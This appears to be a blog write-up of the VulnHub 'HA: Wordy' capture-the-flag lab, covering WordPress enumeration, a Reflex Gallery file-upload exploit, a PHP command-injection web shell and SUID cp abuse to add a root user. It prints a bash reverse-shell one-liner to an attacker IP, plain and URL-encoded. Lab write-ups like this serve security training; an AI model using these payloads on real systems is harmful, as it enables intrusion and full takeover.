<!-- wp:paragraph -->
<p><a href="https://www.vulnhub.com/entry/ha-wordy,363/" target="_blank" rel="noreferrer noopener">https://www.vulnhub.com/entry/ha-wordy,363/</a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph {"align":"center","backgroundColor":"vivid-purple","fontSize":"small"} -->
<p class="has-text-align-center has-vivid-purple-background-color has-background has-small-font-size">Review</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>Enumerate will lead to a clue and WordPress site</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Use WPscan to enumerate the WordPress site</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Find an exploit for the Reflex gallery</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Upload a PHP command injection script to the folder</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Use command injection to gain a shell</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Check for SUID permissions</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Edit the shadow and passwd for a new root user</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph {"align":"center","backgroundColor":"luminous-vivid-amber","fontSize":"small"} -->
<p class="has-text-align-center has-luminous-vivid-amber-background-color has-background has-small-font-size"><strong>Enumeration</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Run nmap scan to find for open ports.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":6348,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-197.png?w=697" alt="" class="wp-image-6348"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Run a gobuster scan to find for hidden directories. </p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":6349,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-198.png?w=1024" alt="" class="wp-image-6349"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Port 80</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":6351,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-199.png?w=1024" alt="" class="wp-image-6351"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>/info.php</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":6353,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-200.png?w=609" alt="" class="wp-image-6353"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>/notes.txt</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":6354,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-201.png?w=513" alt="" class="wp-image-6354"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>/ wordpress</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":6356,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-202.png?w=1024" alt="" class="wp-image-6356"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Since it has a wordpress website, Let's use WPscan to enumerate more. </p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Found two users.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":6359,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-203.png?w=827" alt="" class="wp-image-6359"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Found an upload folder.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":6380,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-215.png?w=964" alt="" class="wp-image-6380"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":6381,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-216.png?w=1024" alt="" class="wp-image-6381"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>There a whole bunch of vulnerable plugins available. Let's try the following first.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":6379,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-214.png?w=973" alt="" class="wp-image-6379"/><figcaption class="wp-element-caption">Let's try an Arbitrary File Upload.</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Search in searchsploit if there are any reflex gallery exploits.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":6376,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-212.png?w=998" alt="" class="wp-image-6376"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>We can use the exploit to craft a malicious html page with an upload function.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":6378,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-213.png?w=1024" alt="" class="wp-image-6378"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Let's create a html file paste the exploit code. Change the IP address , port and the year and month of the year and month folder found in the uploads directory.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":6383,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-217.png?w=1024" alt="" class="wp-image-6383"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>We get an upload page if done correctly.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":6385,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-218.png?w=750" alt="" class="wp-image-6385"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Craft the command injection php file.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":6393,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-223.png?w=531" alt="" class="wp-image-6393"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Upload the PHP file.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":6389,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-220.png?w=628" alt="" class="wp-image-6389"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":6390,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-221.png?w=816" alt="" class="wp-image-6390"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":6391,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-222.png?w=1024" alt="" class="wp-image-6391"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Let's test the file</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>add the following payload cmd.php?=cmd=pwd</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":6394,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-224.png?w=610" alt="" class="wp-image-6394"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Now let's spawn bash reverse shell</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Remember to wrap the bash script and URL encode the payload. And start a netcat listener. </p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.18.8/1234 0&gt;&amp;1'</code></pre>
<!-- /wp:code -->

<!-- wp:code -->
<pre class="wp-block-code"><code>bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.18.8%2F1234%200%3E%261%27</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph {"align":"center","backgroundColor":"vivid-cyan-blue","fontSize":"small"} -->
<p class="has-text-align-center has-vivid-cyan-blue-background-color has-background has-small-font-size"><strong>Foothold</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>A shell is gained.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":6396,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-225.png?w=986" alt="" class="wp-image-6396"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>We find the first flag is raj home directory.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":6398,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-226.png?w=511" alt="" class="wp-image-6398"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>After come time enumerating I found some SUIDS.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":6400,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-227.png?w=776" alt="" class="wp-image-6400"/><figcaption class="wp-element-caption">the copy command might be a way.</figcaption></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph {"align":"center","backgroundColor":"black","textColor":"white","fontSize":"small"} -->
<p class="has-text-align-center has-white-color has-black-background-color has-text-color has-background has-small-font-size"><strong>Privilege escalation</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>We can copy and edit the passwd &amp; shadow file with /bin/cp SUID permissions.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>First cp the file to the WordPress upload folder and download it to your local machine.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Use openssl to generate a hash and update both files. Use wget to download both files into the machine and place them in their original page.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":6403,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-228.png?w=1024" alt="" class="wp-image-6403"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Use the script command to generate a shell and switch to the newly added root user.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":6405,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-229.png?w=1024" alt="" class="wp-image-6405"/><figcaption class="wp-element-caption">root access is gained.</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Get the final flag.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":6406,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-230.png?w=1024" alt="" class="wp-image-6406"/></figure>
<!-- /wp:image -->
